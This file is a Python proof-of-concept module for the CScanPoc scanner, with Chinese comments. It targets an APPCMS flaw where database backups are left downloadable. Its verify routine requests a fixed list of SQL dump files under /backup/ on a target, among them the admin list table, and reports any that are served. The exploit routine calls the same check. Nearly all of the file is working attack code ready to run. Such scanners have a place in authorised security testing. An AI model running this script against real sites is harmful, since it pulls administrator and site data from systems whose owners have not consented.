# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'APPCMS_0000'  # 平台漏洞编号，留空
    name = 'APPCMS设计权限备份数据库可直接下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-12-20'  # 漏洞公布时间
    desc = '''
        APPCMS设计权限备份数据库可直接下载
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=077157'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'APPCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '024c3e83-69ba-41e9-aa3e-7b801d2aa9c7'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/backup/"
            sqlFile = ['appcms_admin_list_0.sql', 'appcms_app_history_0.sql', 'appcms_app_list_0.sql', 'appcms_cate_relation_0.sql', 'appcms_category_0.sql',
                       'appcms_flink_0.sql', 'appcms_info_list_0.sql', 'appcms_recommend_area_0.sql', 'appcms_resource_list_0.sql', 'appcms_url_rewrite_0.sql']
            for _payload in sqlFile:
                code, head, res, errcode, finalurl = hh.http(url+_payload)
                if code == 200 and "sql" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url+_payload))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
